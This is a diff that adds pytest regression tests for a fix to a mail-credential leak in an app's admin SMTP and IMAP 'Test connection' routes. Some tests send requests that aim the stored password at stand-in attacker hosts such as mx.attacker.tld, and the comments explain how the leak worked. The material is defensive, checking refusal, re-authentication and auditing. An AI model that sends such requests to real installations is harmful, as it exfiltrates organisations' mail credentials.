@@ -237,3 +237,269 @@ async def test_a_correct_password_clears_the_window(make_user, client, login_as,
 
     # Budget reset by the success, so the next wrong guess is a plain 403.
     assert (await _export_with(client, headers, WRONG)).status_code == 403
+
+
+# --- the mail test-connection credential leak ------------------------------
+#
+# Both "Test connection" routes substituted the DECRYPTED stored mail password
+# into a connection whose host, port and TLS mode came verbatim from the request
+# body. So an admin session could read the org's mail credential back out of the
+# installation simply by pointing a test at a host it controls. assert_safe_host
+# does not help: it is an address policy with allow_private=True that also fails
+# open on an unresolvable name, so any public host passes.
+#
+# The gate is the INTERSECTION of "we would substitute the stored secret" and
+# "the target is not the saved one". Either alone is harmless.
+
+SMTP_SECRET = "the-orgs-real-smtp-password"
+
+
+def _persist_smtp(db):
+    from app.services import settings as s
+
+    for key, value in [
+        (s.Keys.SMTP_HOST, "mail.corp.local"),
+        (s.Keys.SMTP_PORT, "587"),
+        (s.Keys.SMTP_USER, "postmaster@corp.local"),
+        (s.Keys.SMTP_PASSWORD, SMTP_SECRET),
+        (s.Keys.SMTP_TLS_MODE, "starttls"),
+    ]:
+        s.set_value(db, key=key, value=value, actor=None)
+    db.commit()
+
+
+@pytest.fixture
+def captured_smtp(monkeypatch):
+    """Capture what aiosmtplib is actually handed."""
+    captured: dict = {}
+
+    async def _fake_send(msg, **kwargs):
+        captured.update(kwargs)
+        return None
+
+    import aiosmtplib
+
+    monkeypatch.setattr(aiosmtplib, "send", _fake_send)
+    return captured
+
+
+async def _test_email(client, headers, override, confirm=None):
+    body = {"to": "ops@example.com", "override": override}
+    if confirm is not None:
+        body["confirm_password"] = confirm
+    return await client.post("/api/admin/settings/email/test", json=body, headers=headers)
+
+
+@pytest.mark.asyncio
+async def test_stored_smtp_secret_is_never_sent_to_a_different_host(
+    make_user, db, client, login_as, captured_smtp
+):
+    """THE defect. Omitting the password means "use the stored one"; pointing
+    the host elsewhere then exfiltrates it."""
+    headers = await _admin(make_user, login_as, email="leak@test.local")
+    _persist_smtp(db)
+
+    resp = await _test_email(
+        client, headers,
+        {"host": "mx.attacker.tld", "port": 2525, "tls_mode": "none", "password": None},
+    )
+
+    assert resp.status_code == 403, resp.text
+    assert resp.json()["code"] == "STEP_UP_REQUIRED"
+    assert captured_smtp.get("password") != SMTP_SECRET
+    assert not captured_smtp, "no connection may be attempted at all"
+
+
+@pytest.mark.asyncio
+async def test_a_different_host_is_allowed_once_re_authenticated(
+    make_user, db, client, login_as, captured_smtp
+):
+    headers = await _admin(make_user, login_as, email="reauth@test.local")
+    _persist_smtp(db)
+
+    resp = await _test_email(
+        client, headers,
+        {"host": "mail2.corp.local", "port": 587, "tls_mode": "starttls", "password": None},
+        confirm=PW,
+    )
+
+    assert resp.status_code == 200, resp.text
+    assert captured_smtp.get("hostname") == "mail2.corp.local"
+    assert captured_smtp.get("password") == SMTP_SECRET  # deliberate, and now re-authed
+
+
+@pytest.mark.asyncio
+async def test_a_wrong_confirm_password_refuses(make_user, db, client, login_as, captured_smtp):
+    headers = await _admin(make_user, login_as, email="wrongpw@test.local")
+    _persist_smtp(db)
+
+    resp = await _test_email(
+        client, headers,
+        {"host": "mx.attacker.tld", "port": 25, "tls_mode": "none", "password": None},
+        confirm=WRONG,
+    )
+
+    assert resp.status_code == 403, resp.text
+    assert resp.json()["code"] == "INVALID_PASSWORD"
+    assert not captured_smtp
+
+
+@pytest.mark.asyncio
+async def test_unchanged_host_needs_no_prompt(make_user, db, client, login_as, captured_smtp):
+    """The common case - re-testing the saved server - must stay frictionless,
+    or the fix becomes an everyday annoyance and gets reverted."""
+    headers = await _admin(make_user, login_as, email="same@test.local")
+    _persist_smtp(db)
+
+    resp = await _test_email(
+        client, headers,
+        {"host": "mail.corp.local", "port": 587, "user": "postmaster@corp.local",
+         "tls_mode": "starttls", "password": None},
+    )
+
+    assert resp.status_code == 200, resp.text
+    assert captured_smtp.get("password") == SMTP_SECRET
+
+
+@pytest.mark.asyncio
+async def test_a_new_host_with_its_own_password_needs_no_prompt(
+    make_user, db, client, login_as, captured_smtp
+):
+    """Nothing stored leaves the box, so there is nothing to gate. Gating on
+    host mismatch alone would break this and it is a legitimate flow: testing a
+    new provider before saving it."""
+    headers = await _admin(make_user, login_as, email="ownpw@test.local")
+    _persist_smtp(db)
+
+    resp = await _test_email(
+        client, headers,
+        {"host": "mail.newprovider.example", "port": 465, "user": "u",
+         "password": "typed-by-the-admin", "tls_mode": "implicit"},
+    )
+
+    assert resp.status_code == 200, resp.text
+    assert captured_smtp.get("password") == "typed-by-the-admin"
+
+
+IMAP_SECRET = "the-orgs-real-imap-password"
+
+
+def _persist_imap(db):
+    from app.services import settings as s
+
+    for key, value in [
+        (s.Keys.IMAP_USE_SMTP_CREDENTIALS, "false"),
+        (s.Keys.IMAP_HOST, "imap.corp.local"),
+        (s.Keys.IMAP_PORT, "993"),
+        (s.Keys.IMAP_USER, "inbox@corp.local"),
+        (s.Keys.IMAP_PASSWORD, IMAP_SECRET),
+    ]:
+        s.set_value(db, key=key, value=value, actor=None)
+    db.commit()
+
+
+@pytest.fixture
+def captured_imap(monkeypatch):
+    """Capture the ImapConfig test_connection is handed, without connecting."""
+    seen: dict = {}
+
+    def _fake(db, override=None):
+        seen["override"] = override
+        return {"ok": True, "error": None, "hint": None, "folders": ["INBOX"]}
+
+    from app.services import imap_poll
+
+    monkeypatch.setattr(imap_poll, "test_connection", _fake)
+    return seen
+
+
+@pytest.mark.asyncio
+async def test_stored_imap_secret_is_never_sent_to_a_different_host(
+    make_user, db, client, login_as, captured_imap
+):
+    headers = await _admin(make_user, login_as, email="imapleak@test.local")
+    _persist_imap(db)
+
+    resp = await client.post(
+        "/api/admin/settings/imap/test",
+        json={"host": "imap.attacker.tld", "port": 993, "user": "inbox@corp.local",
+              "password": None, "tls_mode": "implicit", "mailbox": "INBOX"},
+        headers=headers,
+    )
+
+    assert resp.status_code == 403, resp.text
+    assert resp.json()["code"] == "STEP_UP_REQUIRED"
+    assert "override" not in captured_imap, "no connection may be attempted"
+
+
+@pytest.mark.asyncio
+async def test_imap_blank_user_means_the_stored_one_and_must_not_prompt(
+    make_user, db, client, login_as, captured_imap
+):
+    """The SPA sends user:'' whenever "use SMTP credentials" is on, and the
+    route reads '' as the stored user. Comparing the RAW payload would make
+    every test on such an install look like a foreign target and prompt for a
+    password each time - the fix would then be reverted as unusable."""
+    headers = await _admin(make_user, login_as, email="blankuser@test.local")
+    _persist_imap(db)
+
+    resp = await client.post(
+        "/api/admin/settings/imap/test",
+        json={"host": "imap.corp.local", "port": 993, "user": "",
+              "password": None, "tls_mode": "implicit", "mailbox": "INBOX"},
+        headers=headers,
+    )
+
+    assert resp.status_code == 200, resp.text
+    assert captured_imap["override"].password == IMAP_SECRET
+
+
+@pytest.mark.asyncio
+async def test_a_refused_exfiltration_attempt_is_audited(
+    make_user, db, client, login_as, captured_smtp
+):
+    """A refused attempt to point the stored credential at an attacker's host is
+    the most interesting thing that can happen on this route. Leaving it
+    untraced would repeat the exact gap the gate was written to close."""
+    from app.models.audit_log import AuditEventType, AuditLog
+
+    headers = await _admin(make_user, login_as, email="audited-refusal@test.local")
+    _persist_smtp(db)
+
+    resp = await _test_email(
+        client, headers,
+        {"host": "mx.attacker.tld", "port": 2525, "tls_mode": "none", "password": None},
+    )
+    assert resp.status_code == 403
+
+    rows = (
+        db.query(AuditLog)
+        .filter(AuditLog.event_type == AuditEventType.smtp_test_foreign_target.value)
+        .all()
+    )
+    assert len(rows) == 1
+    assert rows[0].extra["host"] == "mx.attacker.tld"
+    assert rows[0].extra["outcome"] == "refused_step_up_required"
+
+
+@pytest.mark.asyncio
+async def test_the_everyday_test_writes_no_audit_noise(
+    make_user, db, client, login_as, captured_smtp
+):
+    """Recording routine tests against the saved server would bury the rows that
+    matter."""
+    from app.models.audit_log import AuditEventType, AuditLog
+
+    headers = await _admin(make_user, login_as, email="noaudit@test.local")
+    _persist_smtp(db)
+
+    resp = await _test_email(
+        client, headers,
+        {"host": "mail.corp.local", "port": 587, "user": "postmaster@corp.local",
+         "tls_mode": "starttls", "password": None},
+    )
+    assert resp.status_code == 200
+
+    assert db.query(AuditLog).filter(
+        AuditLog.event_type == AuditEventType.smtp_test_foreign_target.value
+    ).count() == 0
